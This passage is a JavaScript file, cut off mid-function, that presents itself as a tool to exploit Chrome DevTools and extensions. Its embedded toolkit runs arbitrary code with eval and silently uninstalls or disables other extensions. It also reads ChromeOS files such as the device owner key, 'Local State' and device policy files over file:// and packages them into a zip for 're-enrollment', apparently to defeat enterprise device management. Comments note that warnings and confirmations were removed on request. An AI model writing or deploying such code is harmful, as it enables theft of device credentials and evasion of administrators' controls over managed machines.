/**
 * @fileoverview Script to interact with Chrome DevTools, extensions, and potentially exploit/debug them.
 * Warning: This script performs actions that could be risky or relate to browser security mechanisms.
 * Use with extreme caution and understanding.
 */
(function () {
    'use strict';

    // --- Constants ---
    const DEVTOOLS_URL = "devtools://devtools/bundled/devtools_app.html";
    const PDF_EXTENSION_ID = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
    const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js";
    const IFRAME_TRACKER_EVENT_REMOVE = 'removeIframe';
    const IFRAME_TRACKER_EVENT_UID_PASS = 'uidPass';
    const IFRAME_PARENT_MESSAGE_TYPE_ACC = 'acc';
    const IFRAME_PARENT_MESSAGE_TYPE_ACK = 'ack';
    const BROWSER_INIT_NAVIGATE_EVENT = 'browserInitNavigate';
    const UPDATER_WEBSOCKET_PLACEHOLDER = "ws://%%updaterurl%%"; // Placeholder for actual updater URL


    // --- Placeholder Content Generation ---
    // NOTE: This section would ideally be handled by a build process.
    // We simulate it here using the previously generated code.

    // 1. EXTJS (Base64 of the previous Advanced Toolkit JS)
    const prevToolkitJS = `
// Combined and Finalized JavaScript Code for Advanced Extension Toolkit

// --- Error Handling (Simplified) ---
window.onerror = function (message, source, lineno, colno, error) {
    console.error("Error:", message, "at", source, lineno, ":", colno, error);
    const errorDiv = document.getElementById('global-error-display');
    if (errorDiv) {
        errorDiv.textContent = \`Error: \${message}\`;
        errorDiv.style.display = 'block';
    } else {
        // Fallback if UI isn't ready
        console.error("UI not ready for error display:", message);
    }
    return true; // Suppress default browser handling
};

function displayGlobalError(message) {
    const errorDiv = document.getElementById('global-error-display');
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
    } else {
         console.error("UI not ready for error display:", message);
    }
}

function clearGlobalError() {
     const errorDiv = document.getElementById('global-error-display');
     if (errorDiv) errorDiv.style.display = 'none';
}

// --- Promise wrapper for Chrome APIs ---
function chromePromise(apiFunction, ...args) {
    return new Promise((resolve, reject) => {
        try {
            apiFunction(...args, (result) => {
                if (chrome.runtime.lastError) {
                    reject(new Error(chrome.runtime.lastError.message || 'Unknown Chrome API Error'));
                } else {
                    resolve(result);
                }
            });
        } catch (error) {
            reject(error); // Catch synchronous errors (e.g., API not available)
        }
    });
}


// --- Path Utilities ---
function assertPath(path) {
  if (typeof path !== 'string') {
    throw new TypeError('Path must be a string. Received ' + JSON.stringify(path));
  }
}

function normalizeStringPosix(path, allowAboveRoot) {
  var res = '';
  var lastSegmentLength = 0;
  var lastSlash = -1;
  var dots = 0;
  var code;
  for (var i = 0; i <= path.length; ++i) {
    if (i < path.length)
      code = path.charCodeAt(i);
    else if (code === 47 /*/*/)
      break;
    else
      code = 47 /*/*/;
    if (code === 47 /*/*/) {
      if (lastSlash === i - 1 || dots === 1) {
        // NOOP
      } else if (lastSlash !== i - 1 && dots === 2) {
        if (res.length < 2 || lastSegmentLength !== 2 || res.charCodeAt(res.length - 1) !== 46 /*.*/ || res.charCodeAt(res.length - 2) !== 46 /*.*/) {
          if (res.length > 2) {
            var lastSlashIndex = res.lastIndexOf('/');
            if (lastSlashIndex !== res.length - 1) {
              if (lastSlashIndex === -1) {
                res = '';
                lastSegmentLength = 0;
              } else {
                res = res.slice(0, lastSlashIndex);
                lastSegmentLength = res.length - 1 - res.lastIndexOf('/');
              }
              lastSlash = i;
              dots = 0;
              continue;
            }
          } else if (res.length === 2 || res.length === 1) {
            res = '';
            lastSegmentLength = 0;
            lastSlash = i;
            dots = 0;
            continue;
          }
        }
        if (allowAboveRoot) {
          if (res.length > 0)
            res += '/..';
          else
            res = '..';
          lastSegmentLength = 2;
        }
      } else {
        if (res.length > 0)
          res += '/' + path.slice(lastSlash + 1, i);
        else
          res = path.slice(lastSlash + 1, i);
        lastSegmentLength = i - lastSlash - 1;
      }
      lastSlash = i;
      dots = 0;
    } else if (code === 46 /*.*/ && dots !== -1) {
      ++dots;
    } else {
      dots = -1;
    }
  }
  return res;
}

function _format(sep, pathObject) {
  var dir = pathObject.dir || pathObject.root;
  var base = pathObject.base || (pathObject.name || '') + (pathObject.ext || '');
  if (!dir) {
    return base;
  }
  if (dir === pathObject.root) {
    return dir + base;
  }
  return dir + sep + base;
}

const posix = {
  // path.resolve([from ...], to)
  resolve: function resolve() {
    var resolvedPath = '';
    var resolvedAbsolute = false;
    var cwd; // Note: process.cwd() won't work in extension context

    for (var i = arguments.length - 1; i >= -1 && !resolvedAbsolute; i--) {
      var path;
      if (i >= 0)
        path = arguments[i];
      else {
         // Cannot reliably get CWD in extension, assume root '/'? Or throw error?
         // For simplicity, let's assume root if no absolute path is given.
         path = '/'; // Fallback assumption
      }

      assertPath(path);

      if (path.length === 0) {
        continue;
      }

      resolvedPath = path + '/' + resolvedPath;
      resolvedAbsolute = path.charCodeAt(0) === 47 /*/*/;
    }

    resolvedPath = normalizeStringPosix(resolvedPath, !resolvedAbsolute);

    if (resolvedAbsolute) {
      if (resolvedPath.length > 0)
        return '/' + resolvedPath;
      else
        return '/';
    } else if (resolvedPath.length > 0) {
      return resolvedPath; // Relative path result
    } else {
      return '.'; // Or maybe '/' depending on desired behavior without CWD
    }
  },

  normalize: function normalize(path) {
    assertPath(path);
    if (path.length === 0) return '.';
    var isAbsolute = path.charCodeAt(0) === 47 /*/*/;
    var trailingSeparator = path.charCodeAt(path.length - 1) === 47 /*/*/;
    path = normalizeStringPosix(path, !isAbsolute);
    if (path.length === 0 && !isAbsolute) path = '.';
    if (path.length > 0 && trailingSeparator) path += '/';
    if (isAbsolute) return '/' + path;
    return path;
  },

  isAbsolute: function isAbsolute(path) {
    assertPath(path);
    return path.length > 0 && path.charCodeAt(0) === 47 /*/*/;
  },

  join: function join() {
    if (arguments.length === 0)
      return '.';
    var joined;
    for (var i = 0; i < arguments.length; ++i) {
      var arg = arguments[i];
      assertPath(arg);
      if (arg.length > 0) {
        if (joined === undefined)
          joined = arg;
        else
          joined += '/' + arg;
      }
    }
    if (joined === undefined)
      return '.';
    return posix.normalize(joined);
  },

  relative: function relative(from, to) {
    assertPath(from);
    assertPath(to);
    if (from === to) return '';
    from = posix.resolve(from); // Resolves based on root assumption if needed
    to = posix.resolve(to);
    if (from === to) return '';
    var fromStart = 1; for (; fromStart < from.length; ++fromStart) { if (from.charCodeAt(fromStart) !== 47 /*/*/) break; }
    var fromEnd = from.length; var fromLen = fromEnd - fromStart;
    var toStart = 1; for (; toStart < to.length; ++toStart) { if (to.charCodeAt(toStart) !== 47 /*/*/) break; }
    var toEnd = to.length; var toLen = toEnd - toStart;
    var length = fromLen < toLen ? fromLen : toLen;
    var lastCommonSep = -1; var i = 0;
    for (; i <= length; ++i) {
      if (i === length) {
        if (toLen > length) { if (to.charCodeAt(toStart + i) === 47 /*/*/) { return to.slice(toStart + i + 1); } else if (i === 0) { return to.slice(toStart + i); } }
        else if (fromLen > length) { if (from.charCodeAt(fromStart + i) === 47 /*/*/) { lastCommonSep = i; } else if (i === 0) { lastCommonSep = 0; } }
        break;
      }
      var fromCode = from.charCodeAt(fromStart + i); var toCode = to.charCodeAt(toStart + i);
      if (fromCode !== toCode) break; else if (fromCode === 47 /*/*/) lastCommonSep = i;
    }
    var out = '';
    for (i = fromStart + lastCommonSep + 1; i <= fromEnd; ++i) { if (i === fromEnd || from.charCodeAt(i) === 47 /*/*/) { if (out.length === 0) out += '..'; else out += '/..'; } }
    if (out.length > 0) return out + to.slice(toStart + lastCommonSep);
    else { toStart += lastCommonSep; if (to.charCodeAt(toStart) === 47 /*/*/) ++toStart; return to.slice(toStart); }
  },

  dirname: function dirname(path) {
    assertPath(path);
    if (path.length === 0) return '.';
    var code = path.charCodeAt(0); var hasRoot = code === 47 /*/*/; var end = -1; var matchedSlash = true;
    for (var i = path.length - 1; i >= 1; --i) { code = path.charCodeAt(i); if (code === 47 /*/*/) { if (!matchedSlash) { end = i; break; } } else { matchedSlash = false; } }
    if (end === -1) return hasRoot ? '/' : '.'; if (hasRoot && end === 1) return '//'; return path.slice(0, end);
  },

  basename: function basename(path, ext) {
    if (ext !== undefined && typeof ext !== 'string') throw new TypeError('"ext" argument must be a string');
    assertPath(path);
    var start = 0; var end = -1; var matchedSlash = true; var i;
    if (ext !== undefined && ext.length > 0 && ext.length <= path.length) {
      if (ext.length === path.length && ext === path) return '';
      var extIdx = ext.length - 1; var firstNonSlashEnd = -1;
      for (i = path.length - 1; i >= 0; --i) { var code = path.charCodeAt(i);
        if (code === 47 /*/*/) { if (!matchedSlash) { start = i + 1; break; } }
        else { if (firstNonSlashEnd === -1) { matchedSlash = false; firstNonSlashEnd = i + 1; }
          if (extIdx >= 0) { if (code === ext.charCodeAt(extIdx)) { if (--extIdx === -1) { end = i; } }
            else { extIdx = -1; end = firstNonSlashEnd; } } } }
      if (start === end) end = firstNonSlashEnd; else if (end === -1) end = path.length;
      return path.slice(start, end);
    } else {
      for (i = path.length - 1; i >= 0; --i) { if (path.charCodeAt(i) === 47 /*/*/) { if (!matchedSlash) { start = i + 1; break; } }
        else if (end === -1) { matchedSlash = false; end = i + 1; } }
      if (end === -1) return ''; return path.slice(start, end);
    }
  },

  extname: function extname(path) {
    assertPath(path);
    var startDot = -1; var startPart = 0; var end = -1; var matchedSlash = true; var preDotState = 0;
    for (var i = path.length - 1; i >= 0; --i) { var code = path.charCodeAt(i);
      if (code === 47 /*/*/) { if (!matchedSlash) { startPart = i + 1; break; } continue; }
      if (end === -1) { matchedSlash = false; end = i + 1; }
      if (code === 46 /*.*/) { if (startDot === -1) startDot = i; else if (preDotState !== 1) preDotState = 1; }
      else if (startDot !== -1) { preDotState = -1; } }
    if (startDot === -1 || end === -1 || preDotState === 0 || (preDotState === 1 && startDot === end - 1 && startDot === startPart + 1)) { return ''; }
    return path.slice(startDot, end);
  },

  format: function format(pathObject) { if (pathObject === null || typeof pathObject !== 'object') { throw new TypeError('The "pathObject" argument must be of type Object. Received type ' + typeof pathObject); } return _format('/', pathObject); },
  parse: function parse(path) {
    assertPath(path);
    var ret = { root: '', dir: '', base: '', ext: '', name: '' }; if (path.length === 0) return ret;
    var code = path.charCodeAt(0); var isAbsolute = code === 47 /*/*/; var start;
    if (isAbsolute) { ret.root = '/'; start = 1; } else { start = 0; }
    var startDot = -1; var startPart = 0; var end = -1; var matchedSlash = true; var i = path.length - 1; var preDotState = 0;
    for (; i >= start; --i) { code = path.charCodeAt(i);
      if (code === 47 /*/*/) { if (!matchedSlash) { startPart = i + 1; break; } continue; }
      if (end === -1) { matchedSlash = false; end = i + 1; }
      if (code === 46 /*.*/) { if (startDot === -1) startDot = i; else if (preDotState !== 1) preDotState = 1; }
      else if (startDot !== -1) { preDotState = -1; } }
    if (startDot === -1 || end === -1 || preDotState === 0 || (preDotState === 1 && startDot === end - 1 && startDot === startPart + 1)) { if (end !== -1) { if (startPart === 0 && isAbsolute) ret.base = ret.name = path.slice(1, end); else ret.base = ret.name = path.slice(startPart, end); } }
    else { if (startPart === 0 && isAbsolute) { ret.name = path.slice(1, startDot); ret.base = path.slice(1, end); } else { ret.name = path.slice(startPart, startDot); ret.base = path.slice(startPart, end); } ret.ext = path.slice(startDot, end); }
    if (startPart > 0) ret.dir = path.slice(0, startPart - 1); else if (isAbsolute) ret.dir = '/';
    return ret;
  },
  sep: '/',
  delimiter: ':',
  win32: null, // Placeholder, not implemented
  posix: null // Placeholder, this IS posix
};
posix.posix = posix; // Self-reference


// --- File Reading (Attempt using fetch) ---
const kFilesToPackage = [ // Files for the zip feature
    "/var/lib/devicesettings/owner.key",
    "/home/chronos/Local State"
];

async function readFile(path) {
    // No warnings as requested
    try {
        const response = await fetch("file://" + path);
        if (!response.ok) {
            throw new Error(\`Fetch failed: \${response.status} \${response.statusText}\`);
        }
        return await response.arrayBuffer();
    } catch (error) {
        console.error(\`readFile failed for "\${path}":\`, error);
        // Re-throw a simpler error for the UI handler
        throw new Error(\`Could not read file "\${path}": \${error.message}\`);
    }
}

async function findLastPolicyFile() {
    const kDevicePolicy = "/var/lib/devicesettings/policy.";
    let foundSomething = false;
    let i = 0;
    const maxChecks = 100; // Safety limit
    while (i < maxChecks) {
        const currentPath = kDevicePolicy + i;
        try {
            // console.log("Trying " + currentPath); // Optional debug logging
            await readFile(currentPath); // Check if readable
            foundSomething = true;
        } catch (e) {
            if (foundSomething) {
                const lastGoodPath = kDevicePolicy + (i - 1);
                // console.log("Found last policy file:", lastGoodPath); // Optional debug logging
                return lastGoodPath;
            }
             // Stop if the first one fails or any non-consecutive one fails
            break;
        }
        i++;
    }
    // If loop finished finding files up to the limit, return the last one found
     if (foundSomething && i === maxChecks) {
        return kDevicePolicy + (i - 1);
     }
    // console.log("Policy file search completed."); // Optional debug logging
    return null; // Indicate not found or accessible
}

// --- UI Templates ---
const uiTemplates = {
    mainLayout: \`
        <div id="global-error-display" style="color: red; background-color: #fee; padding: 10px; border: 1px solid red; display: none; margin-bottom: 15px; white-space: pre-wrap;"></div>
        <h1>Advanced Extension Toolkit</h1>
        <div id="app-container">
            <!-- Sections will be injected here -->
        </div>
         <div id="notes-section" style="margin-top: 20px; padding-top: 10px; border-top: 1px solid #ccc; font-size: 0.9em; color: #555;">
            <p>Use features like code evaluation and file access responsibly.</p>
        </div>
    \`,
    management: \`
        <div id="management-section" class="feature-section">
            <h2>Extension Management</h2>
            <input type="text" id="ext-search" placeholder="Search extensions..." style="width: calc(80% - 90px); margin-bottom: 10px; padding: 5px;">
            <button id="report-csv-btn" title="Download extension list as CSV" style="padding: 5px 10px;">Report CSV</button>
            <div id="ext-list-container" style="max-height: 400px; overflow-y: auto; border: 1px solid #ccc; padding: 5px; min-height: 50px;">
                Loading...
            </div>
        </div>
    \`,
    scripting: \`
        <div id="scripting-section" class="feature-section">
            <h2>Scripting</h2>
            <div>
                <h3>Evaluate Code in Extension Context (using eval)</h3>
                <textarea id="code-input" rows="6" style="width: 95%; font-family: monospace;"></textarea><br/>
                <button id="code-evaluate">Evaluate</button>
                <input type="text" id="save-script-name" placeholder="Script name" style="margin-left: 10px;">
                <button id="save-script-btn">Save</button>
                <select id="saved-scripts-dropdown" style="margin-left: 5px;">
                    <option value="">Load Saved Script</option>
                </select>
                <button id="delete-script-btn" title="Delete selected saved script">Delete</button>
                <pre id="eval-output" style="background-color: #eee; padding: 5px; margin-top: 5px; max-height: 100px; overflow-y: auto; border: 1px solid #ddd; white-space: pre-wrap; word-wrap: break-word;"></pre>
            </div>
            <div style="margin-top: 15px;">
                <h3>Inject Content Script into Active Tab</h3>
                <input type="text" id="content-script-url" placeholder="Optional URL pattern (e.g., https://*.example.com/*)" style="width: 60%">
                <button id="inject-script-btn">Inject Example Script</button>
            </div>
        </div>
    \`,
    fileViewer: \`
        <div id="file-viewer-section" class="feature-section">
            <h2>File Content Viewer (Read-Only)</h2>
            <input type="text" id="file-path-input" placeholder="Enter absolute file path..." style="width: calc(100% - 100px);">
            <button id="view-file-btn">View File</button>
            <div id="file-content-output" style="margin-top: 10px; border: 1px solid #ccc; padding: 10px; max-height: 400px; overflow: auto; background: #f8f8f8; min-height: 50px;">
                Enter path and click view. File access may be restricted.
            </div>
        </div>
    \`,
     reenroll: \`
         <div id="reenroll-section" class="feature-section">
             <h2>Re-enrollment Data Package</h2>
             <button id="forreenroll">Attempt Download Zip</button>
             <p id="reenroll-status" style="font-size: 0.9em; margin-top: 5px; color: #333;"></p>
         </div>
    \`,
    systemInfo: \`
         <div id="system-info-section" class="feature-section">
             <h2>System Information</h2>
             <pre id="platform-info" style="background-color: #eee; padding: 5px; border: 1px solid #ddd; white-space: pre-wrap; word-wrap: break-word;"></pre>
         </div>
    \`
};


// --- Feature Modules ---

class ExtensionManager {
    constructor(containerId) {
        this.container = document.getElementById(containerId);
        this.allExtensions = [];
        this.render();
    }

    render() {
        this.container.innerHTML = uiTemplates.management;
        this.listElement = this.container.querySelector('#ext-list-container');
        this.searchInput = this.container.querySelector('#ext-search');
        this.reportButton = this.container.querySelector('#report-csv-btn');

        this.searchInput.addEventListener('input', () => this.displayExtensions());
        this.reportButton.addEventListener('click', () => this.generateReport());
        this.loadExtensions();
    }

    async loadExtensions() {
        this.listElement.innerHTML = '<i>Loading extensions...</i>';
        try {
            this.allExtensions = await chromePromise(chrome.management.getAll);
            this.allExtensions.sort((a, b) => a.name.localeCompare(b.name));
            this.displayExtensions();
        } catch (error) {
            console.error("Error loading extensions:", error);
            this.listElement.innerHTML = \`<span style="color:red;">Error loading extensions: \${error.message}</span>\`;
            displayGlobalError(\`Failed to load extensions: \${error.message}\`);
        }
    }

    displayExtensions() {
        const searchTerm = this.searchInput.value.toLowerCase();
        this.listElement.innerHTML = '';

        const filteredExtensions = this.allExtensions.filter(ext =>
            ext.id !== chrome.runtime.id &&
            (ext.name.toLowerCase().includes(searchTerm) || ext.id.toLowerCase().includes(searchTerm))
        );

        if (filteredExtensions.length === 0) {
            this.listElement.textContent = 'No extensions found' + (searchTerm ? ' matching search.' : '.');
            return;
        }

        const table = document.createElement('table');
        table.style.width = '100%';
        table.style.borderCollapse = 'collapse';
        table.innerHTML = \`<thead><tr style="text-align: left; border-bottom: 1px solid #ccc;">
            <th style="padding: 4px;">Status</th>
            <th style="padding: 4px;">Name</th>
            <th style="padding: 4px;">ID</th>
            <th style="padding: 4px;">Type</th>
            <th style="padding: 4px;">Version</th>
            <th style="padding: 4px;">Actions</th>
           </tr></thead>\`;
        const tbody = document.createElement('tbody');

        filteredExtensions.forEach(ext => {
            const row = tbody.insertRow();
            row.style.borderBottom = '1px solid #eee';

            const statusCell = row.insertCell(); statusCell.style.padding = '4px';
            const statusToggle = document.createElement('button');
            statusToggle.textContent = ext.enabled ? 'Enabled' : 'Disabled';
            statusToggle.style.color = ext.enabled ? 'green' : 'grey';
            statusToggle.style.cursor = 'pointer';
            statusToggle.title = ext.mayDisable ? \`Click to \${ext.enabled ? 'disable' : 'enable'}\` : 'Cannot be changed';
            statusToggle.disabled = !ext.mayDisable;
            if (!ext.mayDisable) statusToggle.style.cursor = 'not-allowed';

            statusToggle.addEventListener('click', async () => {
                statusToggle.disabled = true; statusToggle.textContent = '...';
                try {
                    await chromePromise(chrome.management.setEnabled, ext.id, !ext.enabled);
                    setTimeout(() => this.loadExtensions(), 200); // Refresh list
                } catch (error) {
                    console.error(\`Error toggling \${ext.id}:\`, error);
                    displayGlobalError(\`Failed to toggle \${ext.name}: \${error.message}\`);
                    setTimeout(() => this.loadExtensions(), 100); // Refresh even on error
                }
            });
            statusCell.appendChild(statusToggle);

            row.insertCell().textContent = ext.name;
            row.insertCell().textContent = ext.id;
            row.insertCell().textContent = ext.installType;
            row.insertCell().textContent = ext.version;

            const actionCell = row.insertCell(); actionCell.style.padding = '4px';
            const uninstallButton = document.createElement('button');
            uninstallButton.textContent = 'Uninstall';
            uninstallButton.title = ext.mayDisable ? \`Uninstall \${ext.name}\` : 'Cannot uninstall';
            uninstallButton.disabled = !ext.mayDisable;
             if (!ext.mayDisable) uninstallButton.style.cursor = 'not-allowed';

            uninstallButton.addEventListener('click', async () => {
                 // No confirmation as requested implicitly by "don't worry"
                 uninstallButton.disabled = true; uninstallButton.textContent = '...';
                 try {
                    await chromePromise(chrome.management.uninstall, ext.id, { showConfirmDialog: false }); // Use API confirmation=false
                    setTimeout(() => this.loadExtensions(), 200);
                 } catch(error) {
                     console.error(\`Error uninstalling \${ext.id}:\`, error);
                     displayGlobalError(\`Failed to uninstall \${ext.name}: \${error.message}\`);
                      setTimeout(() => this.loadExtensions(), 100);
                 }
            });
            actionCell.appendChild(uninstallButton);
        });
        table.appendChild(tbody);
        this.listElement.appendChild(table);
    }

    generateReport() {
        if (this.allExtensions.length === 0) return;
        const header = "ID,Name,Version,Enabled,InstallType,MayDisable\\n";
        const csvContent = header + this.allExtensions
            .filter(ext => ext.id !== chrome.runtime.id)
            .map(ext => [
                \`"\${ext.id}"\`, \`"\${ext.name.replace(/"/g, '""')}"\`, \`"\${ext.version}"\`,
                ext.enabled, \`"\${ext.installType}"\`, ext.mayDisable
            ].join(','))
            .join('\\n');

        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement("a");
        link.href = URL.createObjectURL(blob);
        link.download = \`chrome_extensions_report_\${Date.now()}.csv\`;
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(link.href); // Clean up blob URL
    }
}


class ScriptingTool {
    constructor(containerId) {
        this.container = document.getElementById(containerId);
        this.savedScripts = {};
        this.render();
    }

    render() {
        this.container.innerHTML = uiTemplates.scripting;
        this.codeInput = this.container.querySelector('#code-input');
        this.evalButton = this.container.querySelector('#code-evaluate');
        this.saveNameInput = this.container.querySelector('#save-script-name');
        this.saveButton = this.container.querySelector('#save-script-btn');
        this.loadDropdown = this.container.querySelector('#saved-scripts-dropdown');
        this.deleteButton = this.container.querySelector('#delete-script-btn');
        this.outputPre = this.container.querySelector('#eval-output');
        this.injectButton = this.container.querySelector('#inject-script-btn');
        this.injectUrlInput = this.container.querySelector('#content-script-url');

        this.evalButton.addEventListener('click', () => this.evaluateCodeDirect());
        this.saveButton.addEventListener('click', () => this.saveScript());
        this.loadDropdown.addEventListener('change', (e) => this.loadScript(e.target.value));
        this.deleteButton.addEventListener('click', () => this.deleteScript());
        this.injectButton.addEventListener('click', () => this.injectContentScript());

        this.loadSavedScripts();
    }

    evaluateCodeDirect() {
        const code = this.codeInput.value;
        this.outputPre.textContent = ''; // Clear previous output
        if (!code.trim()) {
             this.outputPre.textContent = '// No code entered.';
             return;
        }
        this.outputPre.textContent = '// Evaluating...';
        try {
            // Direct eval in the extension's context (popup)
            // Capture return value and console logs if possible (basic)
            let evalResult;
            const logMessages = [];
            const originalConsoleLog = console.log; // Store original
            console.log = (...args) => { // Temporarily override console.log
                 logMessages.push(args.map(arg => String(arg)).join(' ')); // Convert args to string
                 originalConsoleLog.apply(console, args); // Still log normally
            };

            try {
                evalResult = eval(code); // <<< Use eval as requested
            } finally {
                console.log = originalConsoleLog; // Restore original console.log
            }

            let outputText = '';
            if (logMessages.length > 0) {
                outputText += '// Console logs:\\n' + logMessages.join('\\n') + '\\n\\n';
            }
             outputText += '// Return value:\\n';
            if (typeof evalResult === 'undefined') {
                outputText += 'undefined';
            } else {
                 try {
                    outputText += JSON.stringify(evalResult, null, 2); // Pretty print if possible
                 } catch (stringifyError) {
                      outputText += String(evalResult); // Fallback to string conversion
                 }
            }
             this.outputPre.textContent = outputText;

        } catch (error) {
            console.error("Evaluation error:", error);
            this.outputPre.textContent = \`// Evaluation Error:\\n\${error.stack || error.message}\`;
        }
    }


    async loadSavedScripts() {
        try {
            const result = await chromePromise(chrome.storage.local.get, 'savedEvalScripts');
            this.savedScripts = result.savedEvalScripts || {};
            this.updateDropdown();
        } catch (error) {
            console.error("Error loading scripts:", error);
            displayGlobalError("Could not load saved scripts.");
        }
    }

    updateDropdown() {
        this.loadDropdown.innerHTML = '<option value="">Load Saved Script</option>';
        const names = Object.keys(this.savedScripts).sort(); // Sort names alphabetically
        names.forEach(name => {
             const option = document.createElement('option');
             option.value = name;
             option.textContent = name;
             this.loadDropdown.appendChild(option);
        });
        this.deleteButton.disabled = !this.loadDropdown.value;
    }

    loadScript(name) {
        if (name && this.savedScripts[name]) {
            this.codeInput.value = this.savedScripts[name];
            this.saveNameInput.value = name;
        } else {
             this.codeInput.value = '';
             this.saveNameInput.value = '';
        }
         this.deleteButton.disabled = !name;
    }

    async saveScript() {
        const name = this.saveNameInput.value.trim();
        const code = this.codeInput.value;
        if (!name) { displayGlobalError("Script name required."); return; }
        if (!code.trim()) { displayGlobalError("Cannot save empty script."); return; }

        const isOverwrite = this.savedScripts.hasOwnProperty(name);
        // No confirmation for overwrite

        this.savedScripts[name] = code;
        try {
            await chromePromise(chrome.storage.local.set, { savedEvalScripts: this.savedScripts });
            this.updateDropdown();
            this.loadDropdown.value = name; // Select the saved script
             this.deleteButton.disabled = false;
             displayGlobalError(\`Script "\${name}" \${isOverwrite ? 'updated' : 'saved'}.\`); // Simple status
             setTimeout(clearGlobalError, 2000); // Clear status after a bit
        } catch (error) {
             console.error("Error saving script:", error);
             displayGlobalError(\`Failed to save script "\${name}": \${error.message}\`);
             // Revert local change on error? Complicates things, skip for now.
        }
    }

     async deleteScript() {
         const name = this.loadDropdown.value;
         if (!name) return;
         // No confirmation

         delete this.savedScripts[name];
         try {
            await chromePromise(chrome.storage.local.set, { savedEvalScripts: this.savedScripts });
            this.updateDropdown();
            this.codeInput.value = '';
            this.saveNameInput.value = '';
            displayGlobalError(\`Script "\${name}" deleted.\`);
             setTimeout(clearGlobalError, 2000);
        } catch (error) {
             console.error("Error deleting script:", error);
             displayGlobalError(\`Failed to delete script "\${name}": \${error.message}\`);
             // Revert local change?
        }
     }

     async injectContentScript() {
        const targetUrlPattern = this.injectUrlInput.value.trim();
        // Simple example script
        const funcToInject = (msg) => {
             console.log('Injected:', msg, document.location.href);
             document.body.style.outline = '5px dashed hotpink';
             setTimeout(() => { document.body.style.outline = ''; }, 2500);
        };
        const argsToInject = ["Toolkit Script Injected!"];

        try {
             const [activeTab] = await chromePromise(chrome.tabs.query, { active: true, currentWindow: true });
             if (!activeTab) { throw new Error("No active tab found."); }

             const target = { tabId: activeTab.id };

             // Basic URL pattern check if provided
             if (targetUrlPattern) {
                 let matches = false;
                 try {
                     // Basic wildcard matching
                     const regexPattern = '^' + targetUrlPattern.replace(/[.+?^\${}()|[\]\\]/g, '\\\\$&').replace(/\\*/g, '.*') + '$';
                     if (new RegExp(regexPattern).test(activeTab.url)) {
                         matches = true;
                     }
                 } catch (e) { console.error("Invalid pattern?", e); } // Ignore invalid patterns for simplicity
                  if (!matches) {
                      displayGlobalError(\`Active tab URL does not match pattern. Skipped.\`);
                      setTimeout(clearGlobalError, 3000);
                      return;
                  }
             }

             // Use chrome.scripting API (Requires "scripting" permission)
             if (!chrome.scripting || !chrome.scripting.executeScript) {
                 throw new Error("chrome.scripting API not available/permitted.");
             }

             await chromePromise(chrome.scripting.executeScript, {
                 target: target,
                 func: funcToInject,
                 args: argsToInject,
                 // world: 'MAIN' // Can be 'MAIN' or 'ISOLATED' (default)
             });
             displayGlobalError(\`Example script injected into active tab.\`);
             setTimeout(clearGlobalError, 2000);

         } catch (error) {
             console.error("Error injecting script:", error);
             displayGlobalError(\`Injection failed: \${error.message}\`);
         }
     }
}

class FileViewer {
    constructor(containerId) {
        this.container = document.getElementById(containerId);
        this.render();
        // Syntax highlighter (Prism) is omitted for pure JS focus, as requested
    }

     render() {
         this.container.innerHTML = uiTemplates.fileViewer;
         this.pathInput = this.container.querySelector('#file-path-input');
         this.viewButton = this.container.querySelector('#view-file-btn');
         this.outputDiv = this.container.querySelector('#file-content-output');

         this.viewButton.addEventListener('click', () => this.displayFileContent());
     }

    async displayFileContent() {
        const path = this.pathInput.value.trim();
        this.outputDiv.textContent = ''; // Clear previous
        if (!path) return;

        this.outputDiv.innerHTML = '<i>Loading...</i>';
        this.viewButton.disabled = true;

        try {
            const buffer = await readFile(path); // Uses global readFile
            const textContent = new TextDecoder('utf-8', { fatal: false }).decode(buffer); // Decode as UTF-8, ignore errors

            const pre = document.createElement('pre');
             pre.style.whiteSpace = 'pre-wrap'; // Wrap long lines
             pre.style.wordBreak = 'break-all'; // Break long words/tokens
            pre.textContent = textContent;
            this.outputDiv.innerHTML = '';
            this.outputDiv.appendChild(pre);

        } catch (error) {
            console.error("Error viewing file:", error);
            this.outputDiv.innerHTML = \`<span style="color: red;">Error: \${error.message}</span>\`;
        } finally {
            this.viewButton.disabled = false;
        }
    }
}

class ReEnrollmentPackager {
     constructor(containerId) {
        this.container = document.getElementById(containerId);
        this.render();
        this.loadJSZip(); // Start loading JSZip immediately
    }

     render() {
        this.container.innerHTML = uiTemplates.reenroll;
        this.packageButton = this.container.querySelector('#forreenroll');
        this.statusP = this.container.querySelector('#reenroll-status');
        this.packageButton.addEventListener('click', () => this.createPackage());
        this.packageButton.disabled = true; // Disabled until JSZip loads
        this.statusP.textContent = "Initializing...";
     }

     async loadJSZip() {
         if (typeof JSZip !== 'undefined') {
             this.statusP.textContent = "Ready.";
             this.packageButton.disabled = false;
             return true;
         }
         this.statusP.textContent = "Loading JSZip library...";
         try {
             await new Promise((resolve, reject) => {
                const script = document.createElement('script');
                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js';
                script.async = true;
                script.onload = resolve;
                script.onerror = () => reject(new Error("Failed to load JSZip script"));
                document.head.appendChild(script);
             });
             this.statusP.textContent = "Ready.";
             this.packageButton.disabled = false;
             return true;
         } catch (error) {
              console.error("JSZip load error:", error);
              this.statusP.textContent = "Error: Failed to load JSZip.";
              this.packageButton.disabled = true;
              return false;
         }
     }

    async createPackage() {
        if (typeof JSZip === 'undefined') {
            displayGlobalError("JSZip library not loaded.");
            // Try loading again?
            if (!await this.loadJSZip()) return;
        }

        this.statusP.textContent = "Starting package creation...";
        this.packageButton.disabled = true;
        let filesAdded = 0;
        const zip = new JSZip();

        // 1. Find policy file (best effort)
        let policyFilePath = null;
        try {
            this.statusP.textContent = "Searching for policy file...";
            policyFilePath = await findLastPolicyFile(); // Uses global func
        } catch (error) {
            this.statusP.textContent = "Policy file search failed."; // Don't display error details here
            console.warn("Policy file search error:", error);
        }

        const filesToTry = [...kFilesToPackage]; // Base list
        if (policyFilePath) {
            filesToTry.push(policyFilePath);
        } else {
             this.statusP.textContent = "Policy file not found/added. Continuing...";
        }

        // 2. Read and add files
        for (const f of filesToTry) {
             const baseName = posix.basename(f);
             this.statusP.textContent = \`Reading \${baseName}...\`;
             try {
                 const buffer = await readFile(f); // Global func
